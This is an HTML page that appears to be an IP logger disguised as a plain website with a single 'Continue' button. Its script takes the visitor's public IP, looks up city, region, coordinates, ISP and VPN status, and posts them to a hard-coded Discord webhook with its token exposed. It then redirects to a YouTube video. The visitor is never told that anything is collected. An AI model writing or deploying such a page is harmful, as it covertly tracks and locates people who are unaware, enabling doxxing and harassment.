<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UMBX - Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to bottom, #0B0B0F, #171731);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            position: relative;
            max-width: 90%;
            width: 450px;
        }
        
        .continue-btn {
            padding: 10px 20px;
            background-color: #5D3FD3;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px #00FFFF;
            animation: glow 1.5s ease-in-out infinite alternate;
        }
        
        .continue-btn:hover {
            background-color: #00FFFF;
            color: #0B0B0F;
        }
        
        @keyframes glow {
            from {
                box-shadow: 0 0 5px #5D3FD3, 0 0 10px #5D3FD3;
            }
            to {
                box-shadow: 0 0 10px #00FFFF, 0 0 20px #00FFFF;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <button id="continueBtn" class="continue-btn">Continue</button>
    </div>

    <script>
        document.getElementById('continueBtn').addEventListener('click', function() {
            
            this.disabled = true;
            this.textContent = 'Loading...';
            
            
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ipAddress = ipData.ip;
                    
                    
                    return fetch(`https://ipapi.co/${ipAddress}/json/`)
                        .then(response => response.json())
                        .then(data => {
                            
                            const webhookData = {
                                embeds: [{
                                    title: "IP Information Collected",
                                    color: 5814783, 
                                    fields: [
                                        { name: "IP Address", value: ipAddress, inline: true },
                                        { name: "Country", value: data.country_name || "Unknown", inline: true },
                                        { name: "Region", value: data.region || "Unknown", inline: true },
                                        { name: "City", value: data.city || "Unknown", inline: true },
                                        { name: "ISP", value: data.org || "Unknown", inline: true },
                                        { name: "Proxy/VPN", value: data.proxy ? "Yes" : "No", inline: true },
                                        { name: "Timezone", value: data.timezone || "Unknown", inline: true },
                                        { name: "Latitude", value: data.latitude ? data.latitude.toString() : "Unknown", inline: true },
                                        { name: "Longitude", value: data.longitude ? data.longitude.toString() : "Unknown", inline: true }
                                    ],
                                    timestamp: new Date().toISOString()
                                }]
                            };
                            
                            
                            return fetch('https://discord.com/api/webhooks/1358863296920289572/Jk0S1qOwoW2xrKL_GT33f_ubYJoPIvLB7ljXWnZdtkayAameCaG2ZBaLz7gQ9TcFpuCi', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify(webhookData)
                            });
                        });
                })
                .then(() => {
                    
                    document.getElementById('continueBtn').textContent = 'Thank you!';
                    
                    
                    setTimeout(() => {
                        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; 
                    }, 1500);
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('continueBtn').textContent = 'Error, try again';
                    document.getElementById('continueBtn').disabled = false;
                });
        });
    </script>
</body>
</html>
